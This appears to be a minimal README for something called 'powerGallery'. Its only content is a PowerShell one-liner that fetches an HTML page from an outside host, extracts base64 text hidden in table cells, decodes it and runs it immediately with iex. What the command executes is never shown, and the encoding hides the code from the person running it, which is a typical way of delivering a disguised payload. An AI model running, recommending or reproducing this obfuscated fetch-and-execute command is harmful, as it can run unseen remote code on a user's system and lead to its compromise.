# powerGallery





```powershell
([regex]::Matches((irm "https://unit259.fyi/pgb"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)}) -replace '<[^>]*>' -replace '^\s*' |%{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($_)) -replace '[^\x20-\x7E]'} | iex
```
